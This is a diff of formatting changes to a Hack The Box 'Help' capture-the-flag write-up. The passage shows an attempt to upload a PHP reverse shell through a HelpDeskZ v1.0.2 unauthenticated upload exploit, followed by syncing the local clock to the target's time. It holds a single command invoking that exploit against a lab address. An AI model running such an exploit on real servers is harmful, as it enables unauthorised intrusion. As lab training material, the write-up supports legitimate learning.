@@ -81,7 +81,7 @@ I used this PHP reverse shell from pentestmonkey: *(http://pentestmonkey.net/too
 ```
 root@kali:~/htb/help# python exploit.py http://10.10.10.121/support/ rshell.php
 Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
-**Sorry, I did not find anything**
+Sorry, I did not find anything
 ```
 This didn't work so I read the script again and thought about why the current time part was so important.  If this was a key part of the exploit, what *is* the current time?
 I reloaded the page in firefox and checked the response headers and saw that the time was behind mine but not by a round number of hours suggesting it wasn't just in a different time zone.
@@ -90,10 +90,10 @@ I went down a little rabbit hole and made a [python script](https://github.com/i
 ```
 root@kali:~/htb/help# python timesync.py
 Original system date:
-Wed 22 May **18:37:33** UTC 2019
-HELP Datetime: 2019-05-22 **18:28:01**
+Wed 22 May <b><u>18:37:33</u></b> UTC 2019
+HELP Datetime: 2019-05-22 <b><u>18:28:01</u></b>
 new system date:
-Wed 22 May **18:28:01** UTC 2019
+Wed 22 May <b><u>18:28:01</u></b> UTC 2019
 ```
 
 *After changing the local system time, it would revert back within a few seconds, even after disabling any kind of NTP daemon and service I could find!  I finally tracked it down to the Guest Additions of VirtualBox being too <helpful> so after disabling* `vboxadd-service` *the time change stuck.*
